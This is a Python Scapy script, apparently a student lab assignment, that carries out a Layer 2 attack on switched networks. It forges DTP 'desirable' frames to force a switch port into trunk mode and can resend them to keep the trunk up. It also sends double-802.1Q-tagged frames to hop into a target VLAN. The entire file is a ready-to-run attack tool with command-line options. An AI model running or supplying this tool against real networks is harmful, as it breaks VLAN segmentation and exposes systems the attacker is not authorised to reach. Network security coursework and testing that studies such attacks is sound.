#!/usr/bin/env python3
# DTP VLAN Hopping Tool | Matricula: 2023-0316 | ITLA
# Uso: sudo python3 dtp_vlan_hopping.py -i eth0 -m [dtp|hopping|ambos]

from scapy.all import *
import struct, argparse, sys, time, threading, os

INTERFAZ = "eth0"
MAC_DTP = "01:00:0c:cc:cc:cc"
INTERVALO = 30
_activo = True

def get_mac(iface):
    try: return get_if_hwaddr(iface)
    except: return "00:11:22:33:44:55"

def snap_dtp(): return b'\xaa\xaa\x03\x00\x00\x0c\x20\x04'

def tlv(tipo, valor):
    return struct.pack('>HH', tipo, 4+len(valor)) + valor

def payload_dtp(mac):
    mb = bytes(int(x,16) for x in mac.split(':'))
    return (tlv(0x0001,b'\x01') + tlv(0x0002,b'\x00'*32) +
            tlv(0x0003,b'\x81\x42') + tlv(0x0004,b'\x81\x42') + tlv(0x0005,mb))

def enviar_dtp(iface, mac, verbose=True):
    snap = snap_dtp()
    frame = Ether(src=mac, dst=MAC_DTP) / Raw(load=snap+payload_dtp(mac))
    if verbose:
        print(f"[*] Enviando DTP Desirable -> {MAC_DTP}")
        print(f"    MAC: {mac} | Interfaz: {iface}")
    sendp(frame, iface=iface, verbose=False)
    if verbose: print("[+] Trama DTP enviada. Negociando trunk...")

def hopping_doble_encapsulacion(iface, mac, vlan_nat, vlan_obj, ip_dst):
    print(f"\n[DEMO] VLAN Hopping - Doble Encapsulacion")
    print(f"  VLAN Nativa : {vlan_nat}")
    print(f"  VLAN Objetivo: {vlan_obj}")
    print(f"  IP Destino  : {ip_dst}")
    frame = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
             Dot1Q(vlan=vlan_nat) / Dot1Q(vlan=vlan_obj) /
             IP(dst=ip_dst) / ICMP())
    print("[*] Enviando frame doble encapsulado...")
    sendp(frame, iface=iface, verbose=False, count=3)
    print(f"[+] Frames enviados a VLAN {vlan_obj} via hopping")

def modo_persistente(iface, mac, intervalo):
    global _activo
    n = 0
    while _activo:
        n += 1
        enviar_dtp(iface, mac, False)
        print(f"[~] Re-envio DTP #{n} (mantener trunk) - Ctrl+C para detener")
        time.sleep(intervalo)

def main():
    print("DTP VLAN Hopping | Matricula: 2023-0316 | ITLA")
    p = argparse.ArgumentParser()
    p.add_argument("-i", default=INTERFAZ)
    p.add_argument("-m", choices=["dtp","hopping","ambos"], required=True)
    p.add_argument("--vlan-nativa", type=int, default=1)
    p.add_argument("--vlan-objetivo", type=int, default=200)
    p.add_argument("--ip-destino", default="20.23.3.100")
    p.add_argument("-p","--persistente", action="store_true")
    a = p.parse_args()
    mac = get_mac(a.i)

    print(f"  Interfaz: {a.i} | MAC: {mac} | Modo: {a.m}")

    if a.m in ["dtp","ambos"]:
        print(f"\n[ATAQUE] Negociacion DTP -> forzar modo TRUNK")
        enviar_dtp(a.i, mac)
        if a.persistente:
            hilo = threading.Thread(target=modo_persistente,
                                    args=(a.i, mac, INTERVALO), daemon=True)
            hilo.start()

    if a.m in ["hopping","ambos"]:
        time.sleep(2)
        hopping_doble_encapsulacion(a.i, mac, a.vlan_nativa, a.vlan_objetivo, a.ip_destino)

    if a.persistente and a.m in ["dtp","ambos"]:
        try:
            print("\nTrunk activo. Ctrl+C para terminar...")
            while True: time.sleep(1)
        except KeyboardInterrupt:
            global _activo; _activo = False
            print("\n[!] Detenido")

if __name__ == "__main__":
    if os.geteuid() != 0: sys.exit("[!] Root requerido")
    main()
